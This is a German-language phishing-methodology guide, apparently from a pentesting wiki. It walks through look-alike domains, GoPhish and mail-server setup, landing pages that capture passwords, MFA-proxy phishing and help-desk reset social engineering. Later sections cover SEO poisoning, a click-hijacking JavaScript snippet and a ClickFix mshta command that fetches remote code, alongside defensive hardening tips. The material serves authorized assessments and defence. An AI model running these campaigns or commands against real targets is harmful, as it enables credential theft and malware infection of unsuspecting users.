# Phishing-Methodik

{{#include ../../banners/hacktricks-training.md}}

## Methodik

1. Das Opfer erkunden
   1. Die **Opfer-Domain** auswählen.
   2. Eine grundlegende Web-Aufklärung durchführen, **nach Login-Portalen suchen**, die vom Opfer verwendet werden, und **entscheiden**, welches davon **imitiert** werden soll.
   3. **OSINT** nutzen, um **E-Mail-Adressen zu finden**.
2. Die Umgebung vorbereiten
   1. Die **Domain kaufen**, die für das Phishing-Assessment verwendet werden soll
   2. Die zugehörigen **Einträge des E-Mail-Dienstes konfigurieren** (SPF, DMARC, DKIM, rDNS)
   3. Den VPS mit **gophish** konfigurieren
3. Die Kampagne vorbereiten
   1. Die **E-Mail-Vorlage** vorbereiten
   2. Die **Webseite** zum Stehlen der Zugangsdaten vorbereiten
4. Die Kampagne starten!

## Ähnliche Domainnamen generieren oder eine vertrauenswürdige Domain kaufen

### Techniken zur Variation von Domainnamen

- **Keyword**: Der Domainname **enthält** ein wichtiges **Keyword** der ursprünglichen Domain (z. B. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Bindestrich-Subdomain**: Den **Punkt durch einen Bindestrich ersetzen** (z. B. www-zelster.com).
- **Neue TLD**: Dieselbe Domain mit einer **neuen TLD** verwenden (z. B. zelster.org)
- **Homoglyph**: Einen Buchstaben im Domainnamen durch **ähnlich aussehende Buchstaben ersetzen** (z. B. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Zwei Buchstaben im Domainnamen **vertauschen** (z. B. zelsetr.com).
- **Singularisierung/Pluralisierung**: Ein „s“ am Ende des Domainnamens hinzufügen oder entfernen (z. B. zeltsers.com).
- **Auslassung**: Einen Buchstaben aus dem Domainnamen **entfernen** (z. B. zelser.com).
- **Wiederholung:** Einen Buchstaben im Domainnamen **wiederholen** (z. B. zeltsser.com).
- **Ersetzung**: Wie Homoglyph, aber weniger unauffällig. Einen Buchstaben im Domainnamen ersetzen, möglicherweise durch einen Buchstaben, der auf der Tastatur neben dem ursprünglichen Buchstaben liegt (z. B. zektser.com).
- **Subdomain-Einschub**: Einen **Punkt** in den Domainnamen einfügen (z. B. ze.lster.com).
- **Einfügung**: Einen Buchstaben in den Domainnamen **einfügen** (z. B. zerltser.com).
- **Fehlender Punkt**: Die TLD an den Domainnamen anhängen (z. B. zelstercom.com)

**Automatische Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webseiten**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Es besteht die **Möglichkeit, dass einige gespeicherte oder übertragene Bits aufgrund verschiedener Faktoren wie Sonneneruptionen, kosmischer Strahlung oder Hardwarefehlern automatisch umkippen**.

Wird dieses Konzept **auf DNS-Anfragen angewendet**, ist es möglich, dass die **beim DNS-Server eingehende Domain** nicht mit der ursprünglich angefragten Domain übereinstimmt.

Beispielsweise kann eine einzelne Bitänderung in der Domain „windows.com“ diese in „windnws.com“ ändern.

Angreifer können sich dies **zunutze machen, indem sie mehrere durch Bitflipping veränderte Domains registrieren**, die der Domain des Opfers ähneln. Sie beabsichtigen, legitime Nutzer zu ihrer eigenen Infrastruktur umzuleiten.

Weitere Informationen finden Sie unter [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Eine vertrauenswürdige Domain kaufen

Unter [https://www.expireddomains.net/](https://www.expireddomains.net) können Sie nach einer abgelaufenen Domain suchen, die Sie verwenden könnten.\
Um sicherzustellen, dass die abgelaufene Domain, die Sie kaufen möchten, **bereits eine gute SEO-Bewertung hat**, können Sie nachsehen, wie sie kategorisiert ist:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-Mail-Adressen finden

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % kostenlos)
- [https://phonebook.cz/](https://phonebook.cz) (100 % kostenlos)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Um **weitere** gültige E-Mail-Adressen zu **finden** oder bereits entdeckte Adressen zu **überprüfen**, können Sie versuchen, die SMTP-Server des Opfers per Brute-Force auf diese Adressen zu überprüfen. [Hier erfahren Sie, wie Sie E-Mail-Adressen überprüfen/finden](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Vergessen Sie außerdem nicht: Wenn die Nutzer **ein Webportal für den Zugriff auf ihre E-Mails verwenden**, können Sie prüfen, ob es für **Username Brute Force** anfällig ist, und die Schwachstelle gegebenenfalls ausnutzen.

## GoPhish konfigurieren

### Installation

Sie können es unter [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) herunterladen.

Laden Sie es herunter, entpacken Sie es in `/opt/gophish` und führen Sie `/opt/gophish/gophish` aus.\
In der Ausgabe wird Ihnen ein Passwort für den Admin-Benutzer auf Port 3333 angezeigt. Rufen Sie daher diesen Port auf und verwenden Sie die Zugangsdaten, um das Admin-Passwort zu ändern. Möglicherweise müssen Sie diesen Port auf Ihren lokalen Rechner tunneln:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Konfiguration

**TLS-Zertifikatkonfiguration**

Vor diesem Schritt solltest du die **Domain, die du verwenden möchtest, bereits gekauft haben**. Sie muss auf die **IP-Adresse des VPS** zeigen, auf dem du **gophish** konfigurierst.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Mail-Konfiguration**

Installiere zunächst: `apt-get install postfix`

Füge dann die Domain zu den folgenden Dateien hinzu:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Ändere außerdem die Werte der folgenden Variablen in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Ändere abschließend die Dateien **`/etc/hostname`** und **`/etc/mailname`** so, dass sie deinen Domainnamen enthalten, und **starte deinen VPS neu.**

Erstelle jetzt einen **DNS-A-Record** für `mail.<domain>`, der auf die **IP-Adresse** des VPS verweist, sowie einen **DNS-MX-Record**, der auf `mail.<domain>` verweist.

Testen wir nun den E-Mail-Versand:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish-Konfiguration**

Beenden Sie die Ausführung von gophish und konfigurieren Sie es.\
Ändern Sie `/opt/gophish/config.json` wie folgt (beachten Sie die Verwendung von https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**gophish-Dienst konfigurieren**

Um den gophish-Dienst so einzurichten, dass er automatisch gestartet und als Dienst verwaltet werden kann, kannst du die Datei `/etc/init.d/gophish` mit folgendem Inhalt erstellen:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Schließe die Konfiguration des Dienstes ab und überprüfe ihn mit:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Mailserver und Domain konfigurieren

### Warten und seriös wirken

Je älter eine Domain ist, desto unwahrscheinlicher wird sie als Spam erkannt. Daher solltest du vor dem Phishing-Assessment so lange wie möglich warten (mindestens 1 Woche). Wenn du außerdem eine Seite zu einem seriösen Bereich einrichtest, verbessert sich der Ruf der Domain.

Beachte, dass du die Konfiguration jetzt abschließen kannst, auch wenn du eine Woche warten musst.

### Reverse-DNS-(rDNS-)Eintrag konfigurieren

Richte einen rDNS-(PTR-)Eintrag ein, der die IP-Adresse des VPS zur Domain auflöst.

### Sender Policy Framework (SPF)-Eintrag

Du musst **einen SPF-Eintrag für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein SPF-Eintrag ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Du kannst [https://www.spfwizard.net/](https://www.spfwizard.net) verwenden, um deine SPF-Richtlinie zu generieren (verwende die IP-Adresse des VPS).

![SPF-Wizard-Formular zum Generieren eines SPF-Eintrags für eine Phishing-Domain](<../../images/image (1037).png>)

Folgender Inhalt muss in einem TXT-Eintrag der Domain hinterlegt werden:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domain-based Message Authentication, Reporting & Conformance (DMARC)-Eintrag

Du musst **einen DMARC-Eintrag für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC-Eintrag ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Du musst einen neuen DNS-TXT-Eintrag erstellen, der auf den Hostnamen `_dmarc.<domain>` mit folgendem Inhalt verweist:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Sie müssen **einen DKIM-Eintrag für die neue Domain konfigurieren**. Wenn Sie nicht wissen, was ein DKIM-Eintrag ist, [**lesen Sie diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Dieses Tutorial basiert auf: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Sie müssen beide B64-Werte verketten, die der DKIM-Schlüssel generiert:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testen Sie die Bewertung Ihrer E-Mail-Konfiguration

Das können Sie unter [https://www.mail-tester.com/](https://www.mail-tester.com) tun\
Rufen Sie einfach die Seite auf und senden Sie eine E-Mail an die angegebene Adresse:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Du kannst auch **deine E-Mail-Konfiguration überprüfen**, indem du eine E-Mail an `check-auth@verifier.port25.com` sendest und **die Antwort liest** (dafür musst du Port **25** öffnen und die Antwort in der Datei _/var/mail/root_ ansehen, wenn du die E-Mail als root sendest).\
Stelle sicher, dass du alle Tests bestehst:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Sie könnten auch **eine Nachricht an ein Gmail-Konto unter Ihrer Kontrolle senden** und die **E-Mail-Header** in Ihrem Gmail-Posteingang überprüfen. `dkim=pass` sollte im Header-Feld `Authentication-Results` vorhanden sein.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Entfernen von der Spamhaus-Blacklist

Die Seite [www.mail-tester.com](https://www.mail-tester.com) kann anzeigen, ob Ihre Domain von Spamhaus blockiert wird. Sie können die Entfernung Ihrer Domain/IP-Adresse beantragen unter: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Entfernen von der Microsoft-Blacklist

​​Sie können die Entfernung Ihrer Domain/IP-Adresse beantragen unter [https://sender.office.com/](https://sender.office.com).

## GoPhish-Kampagne erstellen und starten

### Sending Profile

- Legen Sie einen **Namen zur Identifizierung** des Senderprofils fest.
- Entscheiden Sie, von welchem Konto aus Sie die Phishing-E-Mails versenden möchten. Vorschläge: _noreply, support, servicedesk, salesforce..._
- Sie können Benutzername und Passwort leer lassen, müssen aber unbedingt **Ignore Certificate Errors** aktivieren.

![GoPhish-Kampagne erstellen und starten – Sending Profile: Sie können Benutzername und Passwort leer lassen, müssen aber unbedingt Ignore Certificate Errors aktivieren](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Es wird empfohlen, die Funktion „**Send Test Email**“ zu verwenden, um zu testen, ob alles funktioniert.\
> Ich empfehle, die Test-E-Mails an 10-Minuten-Mail-Adressen zu senden, um zu vermeiden, dass Sie beim Testen auf eine Blacklist gesetzt werden.

### E-Mail-Vorlage

- Legen Sie einen **Namen zur Identifizierung** der Vorlage fest.
- Verfassen Sie anschließend einen **Betreff** (nichts Ungewöhnliches, sondern etwas, das Sie in einer normalen E-Mail erwarten würden).
- Achten Sie darauf, dass **Add Tracking Image** aktiviert ist.
- Verfassen Sie die **E-Mail-Vorlage** (Sie können Variablen wie im folgenden Beispiel verwenden):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Beachte, dass **zur Erhöhung der Glaubwürdigkeit der E-Mail** empfohlen wird, eine Signatur aus einer E-Mail des Kunden zu verwenden. Vorschläge:

- Sende eine E-Mail an eine **nicht existierende Adresse** und prüfe, ob die Antwort eine Signatur enthält.
- Suche nach **öffentlichen E-Mail-Adressen** wie info@ex.com, press@ex.com oder public@ex.com, sende ihnen eine E-Mail und warte auf eine Antwort.
- Versuche, **eine gefundene gültige** E-Mail-Adresse zu kontaktieren und warte auf eine Antwort.

![Sendeprofil – E-Mail-Vorlage: Versuche, eine gefundene gültige E-Mail-Adresse zu kontaktieren und warte auf eine Antwort](<../../images/image (80).png>)

> [!TIP]
> Mit der E-Mail-Vorlage lassen sich auch **Dateien zum Versand anhängen**. Wenn du außerdem NTLM-Challenges mithilfe speziell präparierter Dateien/Dokumente stehlen möchtest, [lies diese Seite](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landingpage

- Lege einen **Namen** fest.
- **Schreibe den HTML-Code** der Webseite. Beachte, dass du Webseiten **importieren** kannst.
- Aktiviere **Capture Submitted Data** und **Capture Passwords**.
- Lege eine **Weiterleitung** fest.

![E-Mail-Vorlage – Landingpage: Aktiviere Capture Submitted Data und Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalerweise musst du den HTML-Code der Seite bearbeiten und lokal Tests durchführen (vielleicht mit einem Apache-Server), **bis dir das Ergebnis gefällt.** Schreibe den HTML-Code dann in das Feld.\
> Beachte: Wenn du **statische Ressourcen** für das HTML benötigst (vielleicht CSS- und JS-Dateien), kannst du sie unter _**/opt/gophish/static/endpoint**_ speichern und dann über _**/static/\<filename>**_ auf sie zugreifen.

> [!TIP]
> Für die Weiterleitung kannst du die **Benutzer auf die legitime Hauptwebseite** des Opfers weiterleiten oder sie beispielsweise auf _/static/migration.html_ umleiten, dort ein **Ladesymbol (**[**https://loading.io/**](https://loading.io)**) für 5 Sekunden anzeigen und anschließend mitteilen, dass der Vorgang erfolgreich war**.

### Benutzer & Gruppen

- Lege einen Namen fest.
- **Importiere die Daten** (beachte, dass du für die Beispielvorlage den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst).

![Landingpage – Benutzer & Gruppen: Importiere die Daten (beachte, dass du für die Beispielvorlage den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst)](<../../images/image (163).png>)

### Kampagne

Erstelle abschließend eine Kampagne und lege einen Namen, die E-Mail-Vorlage, die Landingpage, die URL, das Sendeprofil und die Gruppe fest. Beachte, dass die URL der Link ist, der an die Opfer gesendet wird.

Beachte, dass du über das **Sendeprofil eine Test-E-Mail senden kannst, um zu sehen, wie die fertige Phishing-E-Mail aussieht**:

![Benutzer & Gruppen – Kampagne: Beachte, dass du über das Sendeprofil eine Test-E-Mail senden kannst, um zu sehen, wie die fertige Phishing-E-Mail aussieht](<../../images/image (192).png>)

Sobald alles bereit ist, starte einfach die Kampagne!

## Webseiten klonen

Wenn du die Webseite aus irgendeinem Grund klonen möchtest, sieh dir die folgende Seite an:


{{#ref}}
clone-a-website.md
{{#endref}}

## Mit Backdoors versehene Dokumente & Dateien

Bei manchen Phishing-Assessments (vor allem für Red Teams) möchtest du auch **Dateien versenden, die eine Art Backdoor enthalten** (vielleicht ein C2 oder einfach etwas, das eine Authentifizierung auslöst).\
Auf der folgenden Seite findest du einige Beispiele:


{{#ref}}
phishing-documents.md
{{#endref}}

## MFA-Phishing

### Über einen MitM-Proxy

Der vorherige Angriff ist ziemlich ausgeklügelt, da du eine echte Webseite nachahmst und die vom Benutzer eingegebenen Informationen sammelst. Wenn der Benutzer jedoch nicht das korrekte Passwort eingegeben hat oder die nachgeahmte Anwendung mit 2FA konfiguriert ist, **kannst du dich mit diesen Informationen nicht als der hereingelegte Benutzer ausgeben**.

Hier kommen Tools wie [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) und [**muraena**](https://github.com/muraenateam/muraena) zum Einsatz. Mit diesem Tool lässt sich ein MitM-ähnlicher Angriff durchführen. Im Wesentlichen läuft der Angriff folgendermaßen ab:

1. Du **ahmst das Anmeldeformular** der echten Webseite nach.
2. Der Benutzer **sendet** seine **Anmeldedaten** an deine gefälschte Seite, und das Tool sendet sie an die echte Webseite weiter und **prüft, ob die Anmeldedaten funktionieren**.
3. Wenn das Konto mit **2FA** konfiguriert ist, fragt die MitM-Seite danach. Sobald der **Benutzer sie eingibt**, sendet das Tool sie an die echte Webseite weiter.
4. Sobald der Benutzer authentifiziert ist, hast du als Angreifer **die Anmeldedaten, die 2FA, das Cookie und alle Informationen** aus den Interaktionen erfasst, während das Tool einen MitM-Angriff durchführt.

### Über VNC

Was wäre, wenn du das Opfer nicht **auf eine bösartige Seite mit demselben Aussehen wie das Original** schickst, sondern in eine **VNC-Sitzung mit einem Browser, der mit der echten Webseite verbunden ist**? Du kannst sehen, was es tut, und das Passwort, die verwendete MFA, die Cookies und mehr stehlen.\
Das ist mit [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) möglich.<sup>[[3]](#references)[[4]](#references)</sup>

## Erkennen, ob man entdeckt wurde

Eine der besten Möglichkeiten herauszufinden, ob man aufgeflogen ist, besteht natürlich darin, **die eigene Domain in Blacklists zu suchen**. Wenn sie dort auftaucht, wurde deine Domain offenbar als verdächtig eingestuft.\
Eine einfache Möglichkeit zu prüfen, ob deine Domain auf einer Blacklist steht, ist [https://malwareworld.com/](https://malwareworld.com).

Es gibt jedoch weitere Möglichkeiten herauszufinden, ob das Opfer **aktiv nach verdächtigen Phishing-Aktivitäten in freier Wildbahn sucht**, wie hier erklärt:


{{#ref}}
detecting-phising.md
{{#endref}}

Du kannst **eine Domain mit einem Namen kaufen, der dem der Opferdomain sehr ähnlich ist, und/oder ein Zertifikat** für eine **Subdomain** einer von dir kontrollierten Domain **erstellen, die das Schlüsselwort** der Opferdomain **enthält**. Wenn das **Opfer** irgendeine Art von **DNS- oder HTTP-Interaktion** mit diesen Domains durchführt, weißt du, dass es **aktiv nach verdächtigen Domains sucht**, und musst besonders unauffällig vorgehen.<sup>[[2]](#references)</sup>

### Phishing bewerten

Verwende [**Phishious** ](https://github.com/Rices/Phishious), um zu bewerten, ob deine E-Mail im Spam-Ordner landet, blockiert wird oder erfolgreich ist.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne Intrusion Sets überspringen E-Mail-Köder zunehmend vollständig und **zielen direkt auf den Service-Desk- bzw. Identitätswiederherstellungsprozess ab**, um MFA zu umgehen. Der Angriff erfolgt vollständig nach dem Prinzip „living-off-the-land“: Sobald der Operator gültige Anmeldedaten besitzt, bewegt er sich mithilfe integrierter Admin-Tools weiter – Malware ist nicht erforderlich.<sup>[[6]](#references)</sup>

### Angriffsablauf
1. Aufklärung über das Opfer
   * Sammle persönliche und geschäftliche Informationen von LinkedIn, aus Datenlecks, von öffentlichem GitHub usw.
   * Identifiziere besonders wertvolle Identitäten (Führungskräfte, IT, Finanzen) und ermittle den **genauen Help-Desk-Prozess** zum Zurücksetzen von Passwörtern bzw. MFA.
2. Social Engineering in Echtzeit
   * Kontaktiere den Help-Desk telefonisch, über Teams oder im Chat und gib dich als Zielperson aus (oft mit **gefälschter Anrufer-ID** oder **geklonter Stimme**).
   * Gib die zuvor gesammelten personenbezogenen Daten an, um die wissensbasierte Verifizierung zu bestehen.
   * Überzeuge den Mitarbeiter, das **MFA-Geheimnis zurückzusetzen** oder einen **SIM-Swap** für eine registrierte Mobilnummer durchzuführen.
3. Sofortige Aktionen nach dem Zugriff (≤60 Minuten in realen Fällen)
   * Richte über ein beliebiges Web-SSO-Portal einen ersten Zugriffspunkt ein.
   * Ermittle AD / AzureAD mit integrierten Tools (keine Binärdateien werden abgelegt):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateral movement mit **WMI**, **PsExec** oder legitimen **RMM**-Agents, die in der Umgebung bereits auf der Whitelist stehen.

### Erkennung & Eindämmung
* Behandeln Sie die Wiederherstellung von Identitäten durch den Helpdesk als **privilegierten Vorgang** – verlangen Sie eine verstärkte Authentifizierung und die Genehmigung durch eine Führungskraft.
* Setzen Sie Regeln für **Identity Threat Detection & Response (ITDR)** / **UEBA** ein, die bei Folgendem Alarm auslösen:  
  * MFA-Methode geändert + Authentifizierung von einem neuen Gerät / aus einer neuen geografischen Region.
  * Unmittelbare Rechteerweiterung desselben Principals (Benutzer-→-Admin).
* Zeichnen Sie Helpdesk-Anrufe auf und verlangen Sie **einen Rückruf unter einer bereits registrierten Nummer**, bevor ein Zurücksetzen erfolgt.
* Implementieren Sie **Just-In-Time (JIT) / Privileged Access**, damit kürzlich zurückgesetzte Konten nicht automatisch Tokens mit hohen Berechtigungen erben.

---

## Täuschung im großen Maßstab – SEO Poisoning & „ClickFix“-Kampagnen
Massenangriffe helfen Commodity-Gruppen, die Kosten aufwendiger Operationen auszugleichen, indem sie **Suchmaschinen und Werbenetzwerke als Verbreitungskanal** nutzen.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** bringt gefälschte Ergebnisse wie `chromium-update[.]site` an die Spitze der Suchanzeigen.
2. Das Opfer lädt einen kleinen **First-Stage-Loader** herunter (häufig JS/HTA/ISO). Beispiele, die Unit 42 beobachtet hat:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Der Loader exfiltriert Browser-Cookies und Credential-Datenbanken und lädt dann einen **Silent Loader** nach, der *in Echtzeit* entscheidet, ob Folgendes installiert wird:
   * RAT (z. B. AsyncRAT, RustDesk)
   * Ransomware / Wiper
   * Persistenzkomponente (Registry-Run-Key + geplante Aufgabe)

### Tipps zur Härtung
* Blockieren Sie neu registrierte Domains und setzen Sie **Advanced DNS / URL Filtering** sowohl für *Suchanzeigen* als auch für E-Mails durch.
* Beschränken Sie Softwareinstallationen auf signierte MSI- / Store-Pakete und unterbinden Sie die Ausführung von `HTA`, `ISO` und `VBS` per Richtlinie.
* Überwachen Sie Browser-Kindprozesse, die Installer öffnen:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Suche nach LOLBins, die häufig von First-Stage-Loadern missbraucht werden (z. B. `regsvr32`, `curl`, `mshta`).

### Hijacking von Klicks auf Download-Buttons mit TDS-Übergabe
Einige gefälschte Software-Portale lassen den sichtbaren Download-`href` auf die **echte** GitHub-/Release-URL verweisen, hijacken aber die **erste** Benutzerinteraktion mit JavaScript und leiten das Opfer stattdessen in eine **Traffic Distribution System (TDS)**-Kette weiter.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Key-Merkmale:
- Der Hook läuft normalerweise in der **Capture-Phase** (`true`) auf `document` und wird daher vor den Site-Handlern ausgelöst.
- Chrome verwendet häufig `mousedown` statt `click`, damit die Weiterleitung an eine gültige **User-Geste** gebunden bleibt und Popup-Blocker besser umgangen werden.
- Einige Varianten öffnen vorab `about:blank` oder lösen Klicks auf synthetische `<a target="_blank">`-Elemente aus und weisen erst später die TDS-URL zu.
- Browserseitige Limits liegen oft in `localStorage`. Daher kann der **erste Klick** zur Malware führen, während Aktualisierungen und erneute Versuche auf den harmlos wirkenden sichtbaren Link zurückfallen.
- Die TDS kann nach Referrer, Einstiegsdomain, GEO, Browser-/Geräte-Fingerprint, VPN-/Datacenter-Prüfungen, Klickkontext und sitzungsbezogenen Zählern filtern. Dadurch sind Analysten-Replays nicht deterministisch.

Verteidiger-Hinweise:
- Vergleichen Sie das **angezeigte** `href`-Attribut mit dem tatsächlichen Navigationsziel, das beim Klick erzeugt wird.
- Suchen Sie nach `document.addEventListener(..., true)`-Handlern, die in Verbindung mit `window.open`, `about:blank` oder synthetischen Anchor-Klicks sowohl `preventDefault()` als auch `stopImmediatePropagation()` aufrufen.
- Gruppen neu registrierter Software-Download-Domains, die alle dieselbe CloudFront-/JS-Stage laden, sind ein aussagekräftiges Muster für SEO-Poisoning/TDS.

### ClickFix über gefälschte Verifizierungsseiten + LOLBAS-Fetches mit archivartig wirkenden Namen
Einige TDS-Zweige enden auf einer gefälschten Verifizierungsseite (im Stil von Cloudflare/IUAM), die das Opfer auffordert, eine vertrauenswürdige Windows-Binärdatei auszuführen, etwa:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Hinweise:
- `mshta.exe` führt das **HTA/VBScript am Anfang der Antwort** aus, selbst wenn die URL vorgibt, ein `.7z`-Archiv zu sein; angehängte Archivdaten können reine Ablenkung sein.
- Nachfolgende Stufen geben oft weiterhin einen falschen Dateityp vor (`.rtf` für PowerShell, `.asar` für Python, ZIP-Dateien mit aufgefüllten Binärdateien) und wechseln dann zu **manuellem PE-Mapping / In-Memory-Ausführung**.
- Wenn Sie auf eine dieser Angriffsketten reagieren, sichern Sie **Netzwerkdaten und Speicherabbild ab dem ersten erfolgreichen Lauf**: spätere Wiederholungen zeigen möglicherweise nur einen harmlosen Installer-/SFX-Pfad oder schlagen fehl, weil die Freigabe der Payload/des Schlüssels an die ursprüngliche TDS-Sitzung gebunden war.

### ClickFix-DLL-Auslieferungstechnik (gefälschtes CERT-Update)
